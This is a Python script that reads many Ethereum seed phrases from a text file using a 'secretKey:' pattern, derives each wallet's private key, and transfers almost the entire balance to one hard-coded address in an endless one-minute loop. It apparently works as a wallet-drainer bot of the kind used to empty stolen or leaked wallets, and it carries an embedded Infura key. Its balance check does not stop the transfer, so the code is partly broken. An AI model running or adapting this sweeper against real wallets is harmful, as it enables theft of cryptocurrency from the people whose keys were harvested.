from eth_account import Account
from web3 import Web3
import re
from time import time, sleep

# initialize web3 and to account
provider_url = 'https://rinkeby.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
to_address = "0x6120B01De3f0b23893FF09B0A44f6613573cA5A4"
web3 = Web3(Web3.HTTPProvider(provider_url))
# read seeds
file = open('newfile.txt')
content = file.read()
seeds = re.finditer(r'secretKey: ([\s\S]*?\n)', content)


def send_eth(seed, to_address):
    try:
        Account.enable_unaudited_hdwallet_features()
        acct = Account.from_mnemonic(seed)
        address = acct.address
        private_key = acct.privateKey
        account_balance = web3.eth.get_balance(address)
        max_value = account_balance - web3.toWei(0.1, 'ether')
        if account_balance > 1e16:
            print("Account_balance", account_balance)
        else:
            print("No enogh account", account_balance)
        nonce = web3.eth.getTransactionCount(address)
        tx = {
            'nonce': nonce,
            'to': to_address,
            'value': max_value,
            'gas': 2000000,
            'gasPrice': web3.toWei('50', 'gwei')
        }

        # sign the transaction
        signed_tx = web3.eth.account.sign_transaction(tx, private_key)

        # send transaction
        tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)

        # get transaction hash
        print(web3.toHex(tx_hash))
    except Exception as error:
        print("Invalid seed {}".format(seed))

def main():
    for individual_seed in seeds:
        seed = individual_seed
        seed_reg = seed.regs[1]
        pos = seed_reg[0]
        end = seed_reg[1]
        seed_str = content[pos:end]
        seed_str = seed_str.replace('\n', '')
        seed_str = seed_str.strip()
        send_eth(seed_str, to_address)
if __name__ == "__main__":
    while True:
        main()
        sleep(60 - time() % 60)